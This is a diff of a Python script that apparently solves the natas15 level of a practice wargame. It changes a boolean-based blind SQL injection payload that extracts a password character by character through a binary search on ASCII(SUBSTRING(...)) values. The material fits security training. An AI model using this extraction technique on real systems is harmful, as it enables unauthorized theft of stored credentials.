@@ -184,14 +184,14 @@ def find_char(position, session, url, username, password):
         mid = (low + high) // 2
 
         # Is the ASCII value greater than mid?
-        payload = f"natas15' AND ASCII(SUBSTRING(password,{position},1))>{mid}-- "
+        payload = f'natas16" AND ASCII(SUBSTRING(password,{position},1))>{mid}-- '
         r = session.post(url, data={'username': payload}, auth=(username, password))
 
         if "This user exists" in r.text:
             low = mid + 1
         else:
             # Check whether it's exactly equal
-            payload_eq = f"natas15' AND ASCII(SUBSTRING(password,{position},1))={mid}-- "
+            payload_eq = f'natas16" AND ASCII(SUBSTRING(password,{position},1))={mid}-- '
             r2 = session.post(url, data={'username': payload_eq}, auth=(username, password))
             if "This user exists" in r2.text:
                 return chr(mid)
